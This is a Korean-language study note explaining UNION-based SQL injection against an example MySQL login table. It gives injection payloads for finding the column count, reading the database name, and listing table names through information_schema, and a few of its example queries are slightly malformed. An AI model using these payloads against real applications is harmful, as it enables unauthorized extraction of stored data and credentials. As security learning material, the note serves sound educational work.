# UNION sql injection 

__예시 mysql 환경__

```sql
database name -> user

table name -> UserDB

columns -> id, pw

mysql[user]>SELECT * FROM UserDB;

+-------+------------+
| id    | pw         |
+-------+------------+
| admin | passwd     |
| guest | aaa        |
| aaaaa | a          |
+-------+------------+

```

__예시 id 검색__

```sql
SELECT * FROM UserDB WHERE id='';
```


### UNION sql injection 이란?

데이터 베이스에 우리가 입력한 임의의 값으로 요청한다면 해당 임의의 값을 조작하여 UNION 연산자를 이용해 정보를 빼오는 기법이다.

__예시__

```sql
SELECT * FROM UserDB WHERE id='';
```

해당 sql query로 id Column에 값을 입력받는다면

UNION Sql injection 공격을 통해

```sql
SELECT * FROM UserDB WHERE id='' union select 1 --'';
```

이런식으로 union select (원하는 출력값) 이런 형식으로 요청을 하여 데이터 정보를 노출시킨다.

__UNION 연산자는 앞에 써져있는 쿼리의 컬럼 개수와 일정해야지 출력이 가능하다.__

만약에

```sql
SELECT id FROM UserDB id='' union select 1,2 --'';
```

union는 출력되는 컬럼 개수가 같아야지만 사용 가능하다.

하지만 위의 쿼리처럼 처음 select 에서는 id 즉 하나의 열만 출력하는데 
union select에서는 1,2를 출력하면서 2개의 행을 출력하게 되버린다.

근데 union 연산자는 행이 같아야지만 가능하기때문에 에러를 뱉을것이다.

위의 쿼리에서 union을 이용하기 위해서는

```sql
SELECT id FROM UserDB id='' union select 1 --''; 
```

이처럼 열의 개수에 따라 union 연산자를 만족시켜야된다.



### UNION Sql injection Columns Number

__union sql injection를 이용하여 컬럼 개수를 찾이 위해서는__

```sql
SELECT * FROM UserDB WHERE id='' union select 1 --'';

SELECT * FROM UserDB WHERE id='' union select 1,2 --'';

SELECT * FROM UserDB WHERE id='' union select 1,2,3 --'';

SELECT * FROM UserDB WHERE id='' union select 1,2,3,4 --'';

SELECT * FROM UserDB WHERE id='' union select 1,2,3,4,5 --'';

SELECT * FROM UserDB WHERE id='' union select 1,2,3,4,5,6 --'';
```

이처럼 무차별로 대입을 하여 해당 쿼리에서 출력할려는 컬럼 개수가 몇개있는지 유추함으로서 원하는 정보를 빼네올 수 있다.

### UNION Sql injection GET DATABASE Name

해당 쿼리로 id 를 검색한다면

```sql
SELECT * FROM UserDB WHERE id='' UNION SELECT database(),2 --'';
```

이런식으로 database() 함수를 이용하여 데이터가 바로 노출시킬 수 있다.

### UNION Sql injection GET TABLE Name

```sql
SELECT * FROM UserDB WHERE id='' UNION SELECT (SELECT table_name FROM information_schema.tables WHERE table_schema='DATABASE NAME' limit 0,1),2 --'';
```

위처럼 DATABASE NAME 부분에 TABLE NAME을 얻고싶은 데이터베이스 이름을 넣으면 된다.

모든 테이블 이름을 얻고 싶다면 limit 0,1 을 

```sql
limit 1,1 
limit 2,1
limit 3,1
limit 4,1....
```

이런식으로 원하는 열의 테이블을 뽑아올 수 있다.